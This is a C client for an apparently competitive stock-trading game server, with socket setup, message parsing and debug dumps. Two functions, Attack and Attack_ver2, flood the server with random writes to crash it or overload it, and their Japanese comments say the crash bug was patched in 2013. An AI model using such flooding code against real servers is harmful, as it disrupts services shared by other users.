#include "client.h"

int get_stream(const char *host, const char *service) {
    int error, fd;
    struct addrinfo *ai, *ai0, hints;

    memset((void *)&hints, 0, sizeof(struct addrinfo));
    hints.ai_socktype = SOCK_STREAM;
    hints.ai_family = AF_UNSPEC;

    error = -1;
    if (error == getaddrinfo(host, service, &hints, &ai0)) {
        fprintf(stderr, "getaddrinfo(%s, %s, ...): %s(%d)\n", host, service, gai_strerror(error), error);
        exit(-1);
    }

    for (ai = ai0; ai0; ai = ai->ai_next) {
        fd = socket(ai->ai_family, ai->ai_socktype, ai->ai_protocol);
        if (fd != -1) {
            error = connect(fd, ai->ai_addr, ai->ai_addrlen);
            if (error == 0) {
                freeaddrinfo(ai0);
                return fd;
            } else {
                close(fd);
            }
        }
    }
    freeaddrinfo(ai0);
    printf("can't connect to %s\n", host);
    exit(-1);
}

int getData(const int fd, uint32_t *buf) {

    int len = -1;
    int total_read = 0;

    uint32_t tmp;

    for (int i = 0; i < DATA_NUM; i++) {
        len = -1;
        while (len <= 0) {
            len = read(fd, &tmp, sizeof(tmp));
        }
        buf[i] = tmp;
        total_read += len;
        if (i == 1 && ntohl(tmp) == GAME_END) {
            for (int j = 1; j <= 2; j++) {
                len = -1;
                while (len <= 0) {
                    len = read(fd, &tmp, sizeof(tmp));
                }
                buf[i+j] = tmp;
                total_read += len;
            }
            return total_read;
        }
    }

    return total_read;

}

uint32_t Parse (const uint32_t* buf, struct Company* companies) {
    uint32_t key;

    key = ntohl(buf[0]);

    for (int k = 0; k < COMPANY_NUM; k++) {
        companies[k].stock_price = ntohl(buf[3+k*2]);
    }
    return key;
}

uint32_t getCode (const uint32_t* buf) {
    uint32_t code;
    code = ntohl(buf[1]);
    return code;
}

char * getCodeName (const uint32_t code) {
    if (code == TURN_START) {
        return "TURN_START";
    } else if (code == REQ_ACCEPT) {
        return "REQ_ACCEPT";
    } else if (code == REQ_BUY) {
        return "REQ_BUY";
    } else if (code == REQ_SELL) {
        return "REQ_SELL";
    } else if (code == UNKOWN_CODE) {
        return "UNKOWN_CODE";
    } else if (code == INVALID_KEY) {
        return "INVALID_KEY";
    } else if (code == TOO_MUCH_REQ) {
        return "TOO_MUCH_REQ";
    } else if (code == ID_NOT_EXIST) {
        return "ID_NOT_EXIST";
    } else if (code == TOO_MUCH_BUY) {
        return "TOO_MUCH_BUY";
    } else if (code == TOO_MUCH_SELL) {
        return "TOO_MUCH_SELL";
    } else if (code == GAME_END) {
        return "GAME_END";
    } else {
        return "WRONG_CODE!!!!";
    }
}

uint32_t getKey (const uint32_t* buf) {
    uint32_t key;
    key = ntohl(buf[0]);
    return key;
}

int getID (const int idx, const uint32_t* buf) {
    int id;
    id = ntohl(buf[2+2*idx]);
    return id;
}

int getValue (const int idx, const uint32_t* buf) {
    int value;
    value = ntohl(buf[3+2*idx]);
    return value;
}

void dumpBuf (const uint32_t* buf) {
    printf("\n##########start to dump buf##########\n");

    printf("key: %x  code: %s\n", ntohl(buf[0]), getCodeName(getCode(buf)));

    int loop_num = 0;

    if (getCode(buf) == TURN_START) {
        loop_num = COMPANY_NUM;
    } else {
        // loop_num = 1;
        loop_num = COMPANY_NUM;
    }

    for (int i = 0; i < loop_num; i++) {
        printf("id: %d  value: %d\n", getID(i, buf), getValue(i, buf));
    }
    printf("##########    end dump     ##########\n\n");
}

void Attack (const int fd) {
    /*
    サーバーを落とすための関数。
    連続で複数回writeすることでsegmentation faultを引き起こす
    平均20000~30000回のwriteで落ちる模様
    なお、2013/7/18時点でサーバー対応済み
    */

    uint32_t tmp;

    int len = -1;

    for (int i = 0; i < 1000000; i++) {
      len = -1;
      tmp = randomHash();
      while (len == -1) {
        len = write(fd, &tmp, sizeof(tmp));
      }
      printf("%d th time: Attacking %d byte\n", i, len);
    }

}

void Attack_ver2(const int fd) {
    /*
    サーバーを落とすのではなく、高負荷をかけるための関数。
    目的がサーバーのsegmentation faultではないので、
    readも同時に行う。
    毎ターン自分のリクエストが終わった時点で使用することを想定。
    */

    int len = -1;
    int total_read = 0;

    uint32_t tmp;
    uint32_t buf[22];

    while (1) {

        for (int i = 0; i < DATA_NUM; i++) {
          len = -1;
          tmp = randomHash();
          while (len == -1) {
            len = write(fd, &tmp, sizeof(tmp));
          }
          printf("%d th time: Attacking %d byte\n", i, len);
        }

        for (int i = 0; i < DATA_NUM; i++) {
            len = -1;
            while (len <= 0) {
                len = read(fd, &tmp, sizeof(tmp));
            }
            buf[i] = tmp;
            total_read += len;
            if (i == 1 && ntohl(tmp) == GAME_END) {
                for (int j = 1; j <= 2; j++) {
                    len = -1;
                    while (len <= 0) {
                        len = read(fd, &tmp, sizeof(tmp));
                    }
                    buf[i+j] = tmp;
                    total_read += len;
                }
            }
        }
        if (getCode(buf) == TURN_START) {
            break;
        }
    }

}

uint32_t randomHash() {
    int d = UINT32_MAX / RAND_MAX;
    int m = UINT32_MAX % RAND_MAX + 1;
    uint32_t number = (uint32_t)(rand()*d + rand()%m);
    return number;
}